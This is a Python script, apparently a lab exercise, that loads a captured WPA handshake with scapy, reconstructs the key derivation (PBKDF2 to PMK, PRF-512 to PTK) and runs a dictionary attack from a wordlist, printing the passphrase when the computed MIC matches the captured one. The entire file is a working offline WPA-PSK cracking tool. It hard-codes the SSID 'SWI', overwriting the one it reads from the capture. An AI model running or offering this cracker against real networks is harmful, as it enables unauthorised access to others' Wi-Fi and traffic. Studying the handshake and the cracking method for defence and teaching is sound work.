from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib
from scapy.contrib.wpa_eapol import WPA_key


def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

wpa = rdpcap("wpa_handshake.cap")

# Important parameters for key derivation - most of them can be obtained from the pcap file
passPhrase = "actuelle"
A = "Pairwise key expansion"  # this string is used in the pseudo-random function
ssid = wpa[0].info.decode("utf-8")
APmac = a2b_hex(wpa[0].addr2.replace(':', ''))          # "cebcc8fdcab7"
Clientmac = a2b_hex(wpa[2].addr2.replace(':', ''))      # "0013efd015bd"

# Authenticator and Supplicant Nonces
ANonce = wpa[5].getlayer(WPA_key).nonce                 # 90773b9a9661fee1f406e8989c912b45b029c652224e8b561417672ca7e0fd91
SNonce = raw(wpa[6])[65:-72]                            # 7b3826876d14ff301aee7c1072b5e9091e21169841bce9ae8a3f24628f264577

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
mic_to_test = raw(wpa[8])[-18:-2].hex()                 # "36eef66540fa801ceee2fea9b7929b40"

B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce, SNonce)  # used in pseudo-random function
data = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")  # cf "Quelques détails importants" dans la donnée


with open('wordlist.txt','r') as file:
   
    # reading each line    
    for line in file:
        find = False 
        # reading each word        
        for passPhrase in line.split():
   
            # displaying the words           
            # print(passPhrase) 

            #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
            passPhrase = str.encode(passPhrase)
            ssid = str.encode("SWI")
            print(ssid)

            pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)

            #expand pmk to obtain PTK
            ptk = customPRF512(pmk,str.encode(A),B)

            #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
            mic = hmac.new(ptk[0:16],data,hashlib.sha1)

            print ("MIC:\t\t",mic.hexdigest(),"\n", passPhrase)
            if(mic.hexdigest()[0:32] == mic_to_test):
                print("Success ! The key is : ", passPhrase) 
                find = True 
        if find: 
            break 

